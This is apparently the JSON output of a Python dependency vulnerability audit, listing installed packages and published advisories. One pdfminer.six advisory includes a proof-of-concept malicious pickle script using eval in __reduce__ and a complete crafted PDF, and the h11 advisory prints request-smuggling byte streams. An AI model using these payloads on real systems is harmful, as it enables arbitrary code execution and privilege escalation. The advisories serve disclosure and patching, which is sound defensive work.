Found 43 known vulnerabilities in 23 packages
{"dependencies": [{"name": "agno", "version": "0.1.0", "vulns": []}, {"name": "aiofiles", "version": "23.2.1", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.4.6", "vulns": []}, {"name": "aiohttp", "version": "3.11.13", "vulns": [{"id": "GHSA-9548-qrrj-x5pj", "fix_versions": ["3.12.14"], "aliases": ["CVE-2025-53643"], "description": "### Summary The Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a"}]}, {"name": "aiosignal", "version": "1.3.2", "vulns": []}, {"name": "alembic", "version": "1.14.1", "vulns": []}, {"name": "annotated-doc", "version": "0.0.3", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.49.0", "vulns": []}, {"name": "anyio", "version": "3.7.1", "vulns": []}, {"name": "appdirs", "version": "1.4.4", "vulns": []}, {"name": "argcomplete", "version": "3.6.0", "vulns": []}, {"name": "asgiref", "version": "3.8.1", "vulns": []}, {"name": "asttokens", "version": "3.0.0", "vulns": []}, {"name": "attrs", "version": "25.1.0", "vulns": []}, {"name": "auth0-python", "version": "4.8.1", "vulns": []}, {"name": "babel", "version": "2.10.3", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "bcc", "skip_reason": "Dependency not found on PyPI and could not be audited: bcc (0.29.1)"}, {"name": "bcrypt", "version": "4.3.0", "vulns": []}, {"name": "beautifulsoup4", "version": "4.13.3", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.37.11", "vulns": []}, {"name": "botocore", "version": "1.37.11", "vulns": []}, {"name": "brlapi", "skip_reason": "Dependency not found on PyPI and could not be audited: brlapi (0.8.5)"}, {"name": "build", "version": "1.2.2.post1", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cachetools", "version": "5.5.2", "vulns": []}, {"name": "certifi", "version": "2025.1.31", "vulns": []}, {"name": "cffi", "version": "1.17.1", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.1", "vulns": []}, {"name": "chroma-hnswlib", "version": "0.7.6", "vulns": []}, {"name": "chromadb", "version": "0.5.23", "vulns": []}, {"name": "click", "version": "8.1.8", "vulns": []}, {"name": "cloud-init", "skip_reason": "Dependency not found on PyPI and could not be audited: cloud-init (25.1.4)"}, {"name": "cohere", "version": "5.14.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "coloredlogs", "version": "15.0.1", "vulns": []}, {"name": "command-not-found", "skip_reason": "Dependency not found on PyPI and could not be audited: command-not-found (0.3)"}, {"name": "configobj", "version": "5.0.8", "vulns": [{"id": "GHSA-c33w-24p9-8m24", "fix_versions": ["5.0.9"], "aliases": ["CVE-2023-26112"], "description": "All versions of the package configobj are vulnerable to Regular Expression Denial of Service (ReDoS) via the validate function, using (.+?)\\((.*)\\). **Note:** This is only exploitable in the case of a developer, putting the offending value in a server side configuration file."}]}, {"name": "crewai", "version": "0.102.0", "vulns": []}, {"name": "crewai-tools", "version": "0.36.0", "vulns": []}, {"name": "cryptography", "version": "44.0.2", "vulns": []}, {"name": "cupshelpers", "skip_reason": "Dependency not found on PyPI and could not be audited: cupshelpers (1.0)"}, {"name": "cyclonedx-python-lib", "version": "9.1.0", "vulns": []}, {"name": "dataclasses-json", "version": "0.6.7", "vulns": []}, {"name": "dbus-python", "version": "1.3.2", "vulns": []}, {"name": "decorator", "version": "5.2.1", "vulns": []}, {"name": "defer", "skip_reason": "Dependency not found on PyPI and could not be audited: defer (1.0.6)"}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.2.18", "vulns": []}, {"name": "deprecation", "version": "2.1.0", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "distro-info", "skip_reason": "Dependency not found on PyPI and could not be audited: distro-info (1.7+build1)"}, {"name": "docker", "version": "7.1.0", "vulns": []}, {"name": "docker-compose", "version": "1.29.2", "vulns": []}, {"name": "dockerpty", "version": "0.4.1", "vulns": []}, {"name": "docopt", "version": "0.6.2", "vulns": []}, {"name": "docstring-parser", "version": "0.16", "vulns": []}, {"name": "duckdb", "version": "1.2.0", "vulns": []}, {"name": "duplicity", "version": "2.1.4", "vulns": []}, {"name": "durationpy", "version": "0.9", "vulns": []}, {"name": "ecdsa", "version": "0.19.1", "vulns": [{"id": "GHSA-wj6h-64fc-37mp", "fix_versions": [], "aliases": ["CVE-2024-23342"], "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}]}, {"name": "embedchain", "version": "0.1.127", "vulns": []}, {"name": "et-xmlfile", "version": "2.0.0", "vulns": []}, {"name": "eval-type-backport", "version": "0.2.2", "vulns": []}, {"name": "executing", "version": "2.2.0", "vulns": []}, {"name": "fastapi", "version": "0.104.1", "vulns": [{"id": "PYSEC-2024-38", "fix_versions": ["0.109.1"], "aliases": ["GHSA-qf9m-vfgh-m389", "CVE-2024-24762"], "description": "FastAPI is a web framework for building APIs with Python 3.8+ based on standard Python type hints. When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options. An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests. It's a ReDoS(Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This vulnerability has been patched in version 0.109.1."}]}, {"name": "fastavro", "version": "1.10.0", "vulns": []}, {"name": "fasteners", "version": "0.18", "vulns": []}, {"name": "filelock", "version": "3.17.0", "vulns": []}, {"name": "flake8", "version": "7.1.2", "vulns": []}, {"name": "flatbuffers", "version": "25.2.10", "vulns": []}, {"name": "frozenlist", "version": "1.5.0", "vulns": []}, {"name": "fsspec", "version": "2025.2.0", "vulns": []}, {"name": "git-filter-repo", "version": "2.38.0", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.45", "vulns": []}, {"name": "google-api-core", "version": "2.24.1", "vulns": []}, {"name": "google-api-python-client", "version": "2.184.0", "vulns": []}, {"name": "google-auth", "version": "2.38.0", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.2.0", "vulns": []}, {"name": "google-auth-oauthlib", "version": "1.2.2", "vulns": []}, {"name": "google-cloud-aiplatform", "version": "1.82.0", "vulns": []}, {"name": "google-cloud-bigquery", "version": "3.30.0", "vulns": []}, {"name": "google-cloud-core", "version": "2.4.2", "vulns": []}, {"name": "google-cloud-resource-manager", "version": "1.14.1", "vulns": []}, {"name": "google-cloud-storage", "version": "2.19.0", "vulns": []}, {"name": "google-crc32c", "version": "1.6.0", "vulns": []}, {"name": "google-resumable-media", "version": "2.7.2", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.68.0", "vulns": []}, {"name": "gptcache", "version": "0.1.44", "vulns": []}, {"name": "greenlet", "version": "3.1.1", "vulns": []}, {"name": "griffe", "version": "1.6.0", "vulns": []}, {"name": "groq", "version": "0.19.0", "vulns": []}, {"name": "grpc-google-iam-v1", "version": "0.14.0", "vulns": []}, {"name": "grpcio", "version": "1.70.0", "vulns": []}, {"name": "grpcio-status", "version": "1.70.0", "vulns": []}, {"name": "grpcio-tools", "version": "1.70.0", "vulns": []}, {"name": "gspread", "version": "6.2.1", "vulns": []}, {"name": "h11", "version": "0.14.0", "vulns": [{"id": "GHSA-vqfr-h8mv-ghfj", "fix_versions": ["0.16.0"], "aliases": ["CVE-2025-43859"], "description": "### Impact  A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.  ### Details  HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:  - chunk length - `\\r\\n` - `length` bytes of content - `\\r\\n`  In versions of h11 up to 0.14.0, h11 instead parsed them as:  - chunk length - `\\r\\n` - `length` bytes of content - any two bytes  i.e. it did not validate that the trailing `\\r\\n` bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.  By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a _different_ bug in parsing Chunked-Encoding, acting as if the format is:  - chunk length - `\\r\\n` - `length` bytes of content - more bytes of content, as many as it takes until you find a `\\r\\n`  For example, [pound](https://github.com/graygnuorg/pound/pull/43) had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing `\\r\\n`.  In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are `\\r\\n`):  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX2 45 0  GET /two HTTP/1.1 Host: localhost Transfer-Encoding: chunked  0 ```  Here h11 will interpret it as two requests, one with body `AAAAA45` and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body `AAAAXX20\\r\\n\\r\\nGET /two ...`. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if `/two` is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.  Even worse, if our buggy reverse proxy receives two requests from different users:  ``` GET /one HTTP/1.1 Host: localhost Transfer-Encoding: chunked  5 AAAAAXX999 0 ```  ``` GET /two HTTP/1.1 Host: localhost Cookie: SESSION_KEY=abcdef... ```  ...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as _one_ request to `/one` whose body includes `/two`'s session key, potentially allowing one user to steal another's credentials.  ### Patches  Fixed in h11 0.15.0.  ### Workarounds  Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.  ### Credits  Reported by Jeppe Bonde Weikop on 2025-01-09."}]}, {"name": "h2", "version": "4.2.0", "vulns": [{"id": "GHSA-847f-9342-265h", "fix_versions": ["4.3.0"], "aliases": ["CVE-2025-57804"], "description": "### Summary  HTTP/2 request splitting vulnerability allows attackers to perform request smuggling attacks by injecting CRLF characters into headers. This occurs when servers downgrade HTTP/2 requests to HTTP/1.1 without properly validating header names/values, enabling attackers to manipulate request boundaries and bypass security controls."}]}, {"name": "hpack", "version": "4.1.0", "vulns": []}, {"name": "httpcore", "version": "1.0.7", "vulns": []}, {"name": "httplib2", "version": "0.20.4", "vulns": []}, {"name": "httptools", "version": "0.6.4", "vulns": []}, {"name": "httpx", "version": "0.27.2", "vulns": []}, {"name": "httpx-sse", "version": "0.4.0", "vulns": []}, {"name": "huggingface-hub", "version": "0.29.1", "vulns": []}, {"name": "humanfriendly", "version": "10.0", "vulns": []}, {"name": "hyperframe", "version": "6.1.0", "vulns": []}, {"name": "idna", "version": "3.10", "vulns": []}, {"name": "importlib-metadata", "version": "8.5.0", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "instructor", "version": "1.7.2", "vulns": []}, {"name": "ipython", "version": "9.0.1", "vulns": []}, {"name": "ipython-pygments-lexers", "version": "1.1.1", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jinja2", "version": "3.1.2", "vulns": [{"id": "GHSA-h5c8-rqwp-cp95", "fix_versions": ["3.1.3"], "aliases": ["CVE-2024-22195"], "description": "The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix."}, {"id": "GHSA-h75v-3vvj-5mfj", "fix_versions": ["3.1.4"], "aliases": ["CVE-2024-34064"], "description": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.  Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe."}, {"id": "GHSA-q2x7-8rv6-6q7h", "fix_versions": ["3.1.5"], "aliases": ["CVE-2024-56326"], "description": "An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox."}, {"id": "GHSA-gmj6-6f8f-6699", "fix_versions": ["3.1.5"], "aliases": ["CVE-2024-56201"], "description": "A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.  To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename."}, {"id": "GHSA-cpwx-vrp4-4pq7", "fix_versions": ["3.1.6"], "aliases": ["CVE-2025-27516"], "description": "An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup."}]}, {"name": "jiter", "version": "0.8.2", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.4.2", "vulns": []}, {"name": "json-repair", "version": "0.39.1", "vulns": []}, {"name": "json5", "version": "0.10.0", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpath-python", "version": "1.0.6", "vulns": []}, {"name": "jsonpickle", "version": "4.0.2", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonref", "version": "1.1.0", "vulns": []}, {"name": "jsonschema", "version": "4.23.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2024.10.1", "vulns": []}, {"name": "kubernetes", "version": "32.0.1", "vulns": []}, {"name": "lancedb", "version": "0.20.0", "vulns": []}, {"name": "langchain", "version": "0.3.19", "vulns": []}, {"name": "langchain-cohere", "version": "0.3.5", "vulns": []}, {"name": "langchain-community", "version": "0.3.18", "vulns": [{"id": "GHSA-pc6w-59fv-rh23", "fix_versions": ["0.3.27"], "aliases": ["CVE-2025-6984"], "description": "The langchain-ai/langchain project, specifically the EverNoteLoader component, is vulnerable to XML External Entity (XXE) attacks due to insecure XML parsing. The vulnerability arises from the use of etree.iterparse() without disabling external entity references, which can lead to sensitive information disclosure. An attacker could exploit this by crafting a malicious XML payload that references local files, potentially exposing sensitive data such as /etc/passwd. This issue has been fixed in 0.3.27 of langchain-community."}]}, {"name": "langchain-core", "version": "0.3.40", "vulns": []}, {"name": "langchain-experimental", "version": "0.3.4", "vulns": []}, {"name": "langchain-openai", "version": "0.2.14", "vulns": []}, {"name": "langchain-text-splitters", "version": "0.3.6", "vulns": [{"id": "GHSA-m42m-m8cr-8m58", "fix_versions": ["0.3.9"], "aliases": ["CVE-2025-6985"], "description": "The HTMLSectionSplitter class in langchain-text-splitters is vulnerable to XML External Entity (XXE) attacks due to unsafe XSLT parsing. This vulnerability arises because the class allows the use of arbitrary XSLT stylesheets, which are parsed using lxml.etree.parse() and lxml.etree.XSLT() without any hardening measures. In lxml versions up to 4.9.x, external entities are resolved by default, allowing attackers to read arbitrary local files or perform outbound HTTP(S) fetches. In lxml versions 5.0 and above, while entity expansion is disabled, the XSLT document() function can still read any URI unless XSLTAccessControl is applied. This vulnerability allows remote attackers to gain read-only access to any file the LangChain process can reach, including sensitive files such as SSH keys, environment files, source code, or cloud metadata. No authentication, special privileges, or user interaction are required, and the issue is exploitable in default deployments that enable custom XSLT."}]}, {"name": "langchain-xai", "version": "0.1.0", "vulns": []}, {"name": "langsmith", "version": "0.1.147", "vulns": []}, {"name": "language-selector", "skip_reason": "Dependency not found on PyPI and could not be audited: language-selector (0.1)"}, {"name": "launchpadlib", "version": "1.11.0", "vulns": []}, {"name": "lazr-restfulclient", "version": "0.14.6", "vulns": []}, {"name": "lazr-uri", "version": "1.0.6", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "litellm", "version": "1.60.2", "vulns": [{"id": "GHSA-fjcf-3j3r-78rp", "fix_versions": ["1.61.15"], "aliases": ["CVE-2025-0628"], "description": "An improper authorization vulnerability exists in the main-latest version of BerriAI/litellm. When a user with the role 'internal_user_viewer' logs into the application, they are provided with an overly privileged API key. This key can be used to access all the admin functionality of the application, including endpoints such as '/users/list' and '/users/get_users'. This vulnerability allows for privilege escalation within the application, enabling any account to become a PROXY ADMIN."}]}, {"name": "logfire-api", "version": "3.8.0", "vulns": []}, {"name": "louis", "skip_reason": "Dependency not found on PyPI and could not be audited: louis (3.29.0)"}, {"name": "mako", "version": "1.3.9", "vulns": []}, {"name": "markdown-it-py", "version": "3.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.2", "vulns": []}, {"name": "marshmallow", "version": "3.26.1", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.7", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "mem0ai", "version": "0.1.60", "vulns": []}, {"name": "mistralai", "version": "1.5.1", "vulns": []}, {"name": "mmh3", "version": "5.1.0", "vulns": []}, {"name": "monotonic", "version": "1.6", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.1.0", "vulns": []}, {"name": "netaddr", "version": "0.8.0", "vulns": []}, {"name": "networkx", "version": "3.4.2", "vulns": []}, {"name": "nltk", "version": "3.9.1", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "numpy", "version": "1.26.4", "vulns": []}, {"name": "oauth2client", "version": "4.1.3", "vulns": []}, {"name": "oauthlib", "version": "3.2.2", "vulns": []}, {"name": "olefile", "version": "0.46", "vulns": []}, {"name": "onnxruntime", "version": "1.20.1", "vulns": []}, {"name": "openai", "version": "1.65.2", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "openshot-qt", "skip_reason": "Dependency not found on PyPI and could not be audited: openshot-qt (3.1.1)"}, {"name": "opentelemetry-api", "version": "1.30.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.30.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-grpc", "version": "1.30.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-http", "version": "1.30.0", "vulns": []}, {"name": "opentelemetry-instrumentation", "version": "0.51b0", "vulns": []}, {"name": "opentelemetry-instrumentation-asgi", "version": "0.51b0", "vulns": []}, {"name": "opentelemetry-instrumentation-fastapi", "version": "0.51b0", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.30.0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.30.0", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.51b0", "vulns": []}, {"name": "opentelemetry-util-http", "version": "0.51b0", "vulns": []}, {"name": "orjson", "version": "3.10.15", "vulns": []}, {"name": "overrides", "version": "7.7.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.5", "vulns": []}, {"name": "packaging", "version": "24.2", "vulns": []}, {"name": "pandas", "version": "2.2.3", "vulns": []}, {"name": "paramiko", "version": "2.12.0", "vulns": [{"id": "GHSA-45x7-px36-x8w8", "fix_versions": ["3.4.0"], "aliases": ["CVE-2023-48795"], "description": "### Summary  Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.  ### Mitigations  To mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.  **Warning: To take effect, both the client and server must support this countermeasure.**   As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.  ### Details  The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.  The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.  In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.  For more details see [https://terrapin-attack.com](https://terrapin-attack.com).   ### Impact  This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario."}]}, {"name": "parso", "version": "0.8.4", "vulns": []}, {"name": "passlib", "version": "1.7.4", "vulns": []}, {"name": "pdfminer-six", "version": "20231228", "vulns": [{"id": "GHSA-wf5f-4jwr-ppcp", "fix_versions": ["20251107"], "aliases": [], "description": "### Summary  pdfminer.six will execute arbitrary code from a malicious pickle file if provided with a malicious PDF file. The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed.  ### Details  ```python # Vulnerable code in pdfminer/cmapdb.py:233-246 def _load_data(cls, name: str) -> Any:     name = name.replace(\"\\0\", \"\")  # Insufficient sanitization     filename = \"%s.pickle.gz\" % name     # ... path construction ...     path = os.path.join(directory, filename) # If filename is an absolte path, directory is ignored     # ...     return type(str(name), (), pickle.loads(gzfile.read()))  # Unsafe deserialization ```  An attacker can: 1. Create a malicious PDF with a CMap reference like `/malicious` 2. Place a malicious pickle file at `/malicious.pickle.gz` 3. When the PDF is processed, pdfminer loads and deserializes the malicious pickle 4. The pickle deserialization can execute arbitrary Python code  ### POC  #### Malicious PDF  Create a PDF with a malicious CMAP entry:  ``` 5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj ```  Here the /Encoding points to `/pdfs/malicious`. Pdfminer will append the extension `.pickle.gz` to this filename. Place the PDF in a file called `/pdfs/malicious.pdf`.  #### Malicious Pickle  Create a malicious, zipped pickle to execute. For example, with this Python script:  ```python #!/usr/bin/env python3 import pickle import gzip  def create_demo_pickle():     print(\"Creating demonstration pickle file...\")      # Create payload that executes code AND returns a dict (as pdfminer expects)     class EvilPayload:         def __reduce__(self):             # This function will be called during unpickling             code = \"print('Malicious code executed.') or exit(0) or {}\"             return (eval, (code,))      demo_cmap_data = EvilPayload()      # Create the pickle file that the path traversal would access     target_path = \"./malicious.pickle.gz\"      try:         with gzip.open(target_path, 'wb') as f:             pickle.dump(demo_cmap_data, f)         print(f\"\u2713 Created demonstration pickle file: {target_path}\")         return target_path      except Exception as e:         print(f\"\u2717 Error creating pickle file: {e}\")         return None  if __name__ == \"__main__\":     create_demo_pickle() ```  This will create a harmless, zipped pickle file that will display \"Malicious code eecuted.\" then exit when deserialized. Put the file in `/pdfs/malicious.pickle.gz`.  #### Test  Install pdfminer.six and run `pdf2text.py /pdfs/malicious.pdf`. Instead of processing the PDF as normal you should see the output:  ``` $ pdf2txt.py malicious.pdf Malicious code executed! ```  ### Impact  If pdfminer.six processes a malicious PDF which points to a zipped pickle file under the control of an attacker the result is arbitrary code execution on the victim's system. An attacker could execute the Python code of their chosing with the permissions of the process running pdfminer.six.  The difficulty in achieving this depends on the OS, see below.  #### Linux, MacOS - harder to exploit  On Linux-like systems only files on the filesystem can be resolved. An attacker would need to provide the malicious PDF for processing *and* the malicious pickle file would need to be present on the target system in a location that the attacker already knows, since it needs to be set in the PDF itself. In many cases this will be difficult to exploit because even if the attacker provides both the PDF and the pickle file together, there would be no way to know in advance which full path to the pickle file to specify. In many cases this would make exploitation difficult or impossible. However:  * An attacker may find a way to write files to a known location on the target system or * The system in question may, by design, read files from a known location such as a network share designated for PDF ingestion.  Overall, there is generally less risk on a Linux or Linux-like system.  #### Windows - easier to exploit  Windows paths can specify network locations e.g. WebDAV, SMB. This means that an attacker could host the malicious pickle remotely and specify a path to the it in the PDF. Since there is no need to get the malicious pickle file on to the target system, exploitation is easier on a Windows OS.  ### Appendix  A complete, malicious PDF is provided here. A dockerized POC is available upon request.  ``` %PDF-1.4 1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj  2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj  3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >> endobj  4 0 obj << /Length 44 >> stream BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET endstream endobj  5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj  6 0 obj << /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >> endobj  7 0 obj << /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >> endobj  xref 0 8 0000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000274 00000 n 0000000370 00000 n 0000000503 00000 n 0000000673 00000 n trailer << /Size 8 /Root 1 0 R >> startxref 871 %%EOF ```"}, {"id": "GHSA-f83h-ghpp-7wcc", "fix_versions": ["20251107"], "aliases": [], "description": "### Overview  This report **demonstrates a real-world privilege escalation** vulnerability in [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due to unsafe usage of Python's `pickle` module for CMap file loading.   It shows how a low-privileged user can gain root access (or escalate to any service account) by exploiting insecure deserialization in a typical multi-user or server environment.  ## Table of Contents  - [Background](#-background) - [Vulnerability Description](#-vulnerability-description) - [Demo Scenario](#-demo-scenario) - [Technical Details](#-technical-details) - [Setup and Usage](#-setup-and-usage) - [Step-by-step Walkthrough](#-step-by-step-walkthrough) - [Security Standards & References](#-security-standards--references) ---  ## Background  **pdfminer.six** is a popular Python library for extracting text and information from PDF files. It supports CJK (Chinese, Japanese, Korean) fonts via external CMap files, which it loads from disk using Python's `pickle` module.  > **Security Issue:**   > If the CMap search path (`CMAP_PATH` or default directories) includes a world-writable or user-writable directory, an attacker can place a malicious `.pickle.gz` file that will be loaded and deserialized by pdfminer.six, leading to arbitrary code execution.  ---  ### Vulnerability Description  - **Component:** pdfminer.six CMap loading (`pdfminer/cmapdb.py`) - **Issue:** Loads and deserializes `.pickle.gz` files using Python\u2019s `pickle` module, which is unsafe for untrusted data. - **Exploitability:** If a low-privileged user can write to any directory in `CMAP_PATH`, they can execute code as the user running pdfminer\u2014potentially root or a privileged service. - **Impact:** Full code execution as the service user, privilege escalation from user to root, persistence, and potential lateral 